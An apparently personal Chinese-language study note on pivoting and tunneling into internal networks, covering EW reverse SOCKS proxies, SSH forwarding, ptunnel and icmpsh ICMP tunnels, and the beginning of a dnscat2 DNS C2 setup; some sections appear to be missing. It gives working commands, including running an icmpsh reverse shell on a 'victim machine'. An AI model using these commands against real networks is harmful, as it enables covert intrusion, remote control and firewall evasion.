## 0x00 前言
最近在学习内网穿透及端口转发，这里就简单总结一下部分工具及命令，如有不对的地方，请多多指教。
## 0x01 代理
学习内网穿透，我觉得第一步需要先了解一下什么是正向代理和反向代理。
### 正向代理
正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端。  
比如转发，国内不能直接访问谷歌，可是代理服务器可以访问，客户端可以将数据转发到代理服务器，再由代理服务器转发给谷歌获取到数据，再返回客户端。这里代理的是客户端。
    Client --> Proxy  Server
### 反向代理
反向代理即是服务器端代理，代理服务器，客户端不知道实际提供服务的服务器。  
比如nginx，客户端访问想要服务器的8080端口，可是服务器的8080端口不对外开发，这里通过nginx代理端口，将所有访问80端口的流量都转发到8080端口，这样客户端只需要访问80端口就相当于访问了服务器的8080端口。这里代理的是服务器。
    Client  Proxy   
EW 是一套便携式的网络穿透工具，具有 SOCKS
v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。工具包中提供了多种可执行文件，支持Linux、Windows、MacOS、Arm-Linux 多种平台。  
该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。
    其中SOCKS5服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。
    ssocksd 用来开启Socks5代理服务 
    rssocks 本地启用Socks5服务，并反弹到另一IP地址 
    rcsocks 接收反弹过来的Socks5服务，并转向另一端口
    其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。 
    lcx 类别管道：
        lcx_slave，lcx_listen：端口转发
        lcx_tran：端口映射
        lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
        lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
        lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
        通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。
    工具参数说明：
        -l 开放指定端口监听
        -d 指定转发或反弹的主机地址
        -e 指定转发或反弹的主机端口
        -f 指定连接或映射的主机地址
        -g 指定连接或映射的主机端口
        -t 设置超时时间
### 普通网络环境
网络环境拓扑：
#### 正向socks5
当目标网络(Server)边界存在公网IP且可任意开监听端口时
    ew_for_Win.exe -s ssocksd -l 1080
在Server上通过该命令开启 1080 端口的 socks 代理
其他主机可以通过设置代理为`目标IP:1080`添加代理，Windows可以使用SocksCap64，我这里是Kali直接修改`/etc/proxychains.conf`设置代理为目标网络，使用proxychains命令扫描3389端口
数据流向：Kali -> 1080 -> Server
#### 反向socks5
当目标网络边界(Client)不存在公网 IP，需要通过反弹方式创建socks代理  
在具有公网IP的Server上执行以下命令：
    ew_for_Win.exe -s rcsocks -l 1080 -e 8888
在公网主机中添加转接隧道，将1080收到的代理请求转交给反连8888端口的主机
在Client主机上开启socks代理，并反弹到公网的8888端口
    ew_for_Win.exe -s rssocks -d 10.19.11.138 -e 8888
Kali通过访问公网主机的1080端口提供的socks5代理服务来访问目标内网
数据流向：Kali -> 1080 -> Server -> 8888 | 防火墙 |  1080 -> Server B -> 8888 -> Server A
#### 环境二
网络环境拓扑：
在VPS上添加转接隧道，将1080收到的代理请求转交给反连8888端口的主机
    ew_for_Win.exe -s lcx_listen -l 1080 -e 8888
在A主机上开启端口为9999的socks代理
    ew_for_Win.exe -s ssocksd -l 9999
在B主机上利用工具的lcx_slave方式，打通主机A和VPS之间的通讯隧道  
当代理成功时，返回VPS可以看到有`rssocks cmd_socket OK!` 的提示
    ew_for_Win.exe -s lcx_slave -d 10.19.11.138 -e 8888 -f 192.168.44.128 -g 9999
Kali通过访问VPS的1080端口提供的socks5代理服务来访问Server A
数据流向：Kali -> 1080 -> VPS -> 8888 | 防火墙 | -> B -> 9999 -> A
## 0x04 SSH隧道
    ssh参数详解：
        -C Enable compression 压缩数据传输
        -q Quiet mode. 安静模式
        -T Disable pseudo-tty allocation. 不占用 shell
        -f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数
        -N Do not execute a remote command. 不执行远程命令，端口转发就用它
        -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 
        -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 
        -D port 指定一个本地机器动态的应用程序端口转发. 
        -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接
### SSH本地转发
语法格式：
    ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host
远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到1234端口。
    ssh -CfNg -L 2222:127.0.0.1:3306 PI:EMAIL
工作原理：在本地指定一个由ssh监听的转发端口2222，将远程主机的3306端口(127.0.0.1:3306)映射到本地的2222端口，当有主机连接本地映射的2222端口时，本地ssh就将此端口的数据包转发给中间主机VPS，然后VPS再与远程主机端口(127.0.0.1:3306)通信。  
数据流向：Kali -> 2222 -> VPS -> 127.0.0.1:3306
### SSH远程转发
语法格式：
    ssh -R [bind_addr:]remote1_port:host:port remote1
假设kali开了一个80端口的web服务，外网无法访问，使用远程转发，将kali的80端口转发到外网的其他端口，这时候访问外网的端口，就访问到了内网的端口。
    ssh -CfNg -R 4444:127.0.0.1:80 PI:EMAIL
此时在192.168.183.195这台主机上访问127.0.0.1:4444端口即可访问到kali的80端口  
工作原理：kali在请求外网主机的sshd服务，在外网主机上建立一个套接字监听端口(4444)，它是kali的80端口的映射，当有主机连接外网的4444端口时，连接的数据全部转发给kali，再由kali去访问127.0.0.1:80。
这里要注意一点，远程端口转发是由远程主机上的sshd服务控制的，默认配置情况下，sshd服务只允许本地开启的远程转发端口(4444)绑定在环回地址(127.0.0.1)上，即使显式指定了bind_addr也无法覆盖。也就是这里访问127.0.0.1:4444端口可以访问成功，访问192.168.183.195:4444却不能访问成功。
要允许本地的远程转发端口绑定在非环回地址上，需要在外网主机的sshd配置文件中启用"GatewayPorts"项，它的默认值为no，这里将它改为yes。然后重新远程转发一下即可用外网地址访问。
### SSH动态转发
本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如请求为445端口，通过ssh转发的请求也是445端口。
语法格式：
    ssh -D [bind_addr:]port remote
这里举一个最简单的列子：国内正常情况下上不了Google，我们可以通过将流量转发到国外的vps上这样就可以正常访问了。  
在本地执行以下命令，并查看建立连接情况
    ssh -Nfg -D 3333 PI:EMAIL
连接建立成功，设置浏览器到本地主机的3333端口
然后就可以访问Google了
## 0x05 ICMP隧道
注意：在搭建ICMP隧道的时候切记把自身的icmp关闭  
(`sysctl -w net.ipv4.icmp_echo_ignore_all=1`)
### ptunnel
ptunnel，全称“Ping Tunnel”，利用ICMP协议构建通信隧道，实现端到端通信。  
网络环境拓扑：
B、C上需要装ptunnel工具，因为这里A只能ping通B，所以让B作为server，即ICMP跳板机
注意：由于通过ICMP协议建立隧道，为了让隧道服务端能够处理收到的ICMP报文，需要禁用系统本身的ICMP响应机制，防止内核响应ping数据包本身。这里先关闭B的ICMP响应机制，否则会出现`[err]:
Dropping duplicate proxy session request.`报错。
在B上运行命令ptunnel
在C上运行命令
    ptunnel -p 192.168.137.128 -lp 8888 -da 192.168.44.130  -dp 3389
    -p  指定跳板机的IP
    -lp 指定转发本地监听的端口
    -da 指定最终要访问的目标主机
    -dp 指定最终要访问目标主机的端口
此时ICMP隧道就已经打通了，最后在D上访问C的8888端口就相当于访问A的3389端口了
    mstsc /v:192.168.137.129:8888
当然这里也可以让B既作为跳板机，又作为代理服务器
### icmpsh
icmpsh是一个简单的反向ICMP shell，与其他类似的开源工具相比，其主要优势在于它不需要管理权限即可运行到目标计算机上。  
网络环境拓扑：
首先在kali上下载[icmpsh](https://github.com/inquisb/icmpsh)并关闭自身的icmp
    ./icmpsh-m.py  
    sysctl -w net.ipv4.icmp_echo_ignore_all=1
    python icmpsh_m.py 192.168.137.129 192.168.137.132
在受害机上运行以下命令
    icmpsh.exe -t 192.168.137.129
返回kali查看shell
## 0x06 DNS隧道
### dnscat2
内网出口一般对出站流量做了严格限制，但是通常不会限制 DNS 请求，也就是 UDP 53 请求。dnscat2是一款利用 DNS 协议创建加密 C2
隧道来控制服务器的工具。dnscat2 由客户端和服务端两部分组成。
#### 初始化dnscat2服务端
    Server部署
    git clone https://github.com/iagox86/dnscat2.git
    apt-get install ruby-dev 
    cd dnscat2/server/ 
    gem install bundler 